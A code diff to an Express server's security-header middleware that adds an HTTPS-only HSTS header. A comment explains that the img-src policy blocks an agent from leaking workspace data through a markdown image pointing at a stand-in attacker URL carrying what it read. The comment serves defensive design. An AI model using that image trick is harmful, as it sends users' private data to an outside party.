@@ -31,7 +31,12 @@ export function createApp(opts: { webDist?: string; mcpRatePerMin?: number; ipRa
   /* img-src closes the one way an agent could send data out of a workspace. It holds no network tool, but anything it
      writes is later rendered in a browser, so `![](https://attacker/?q=<what it read>)` in a page it authored would be
      fetched by the reader. Imported images are copied into /api/assets, so same-origin covers real content. */
-  app.use((_req, res, next) => { res.setHeader('X-Frame-Options', 'DENY'); res.setHeader('Content-Security-Policy', "frame-ancestors 'none'; img-src 'self' data: blob:"); res.setHeader('X-Content-Type-Options', 'nosniff'); res.setHeader('Referrer-Policy', 'same-origin'); next(); }); // The consent page etc. must not be embeddable
+  app.use((_req, res, next) => {
+    res.setHeader('X-Frame-Options', 'DENY'); res.setHeader('Content-Security-Policy', "frame-ancestors 'none'; img-src 'self' data: blob:"); res.setHeader('X-Content-Type-Options', 'nosniff'); res.setHeader('Referrer-Policy', 'same-origin');
+    // HSTS only where the site really is HTTPS-only (a production APP_URL); on a local http:// origin it would be a lie the browser remembers for a year.
+    if (config.appUrl.startsWith('https://')) res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
+    next();
+  }); // The consent page etc. must not be embeddable
   const byIp = ipLimiter(opts.ipRatePerMin ?? config.ipRatePerMin);
   const byToken = tokenLimiter(opts.mcpRatePerMin ?? config.mcpRatePerMin);
   // Per-IP limit for the web API must be generous (one SPA navigation fires several calls; many users may share a NAT); agent operations have a separate per-user limit
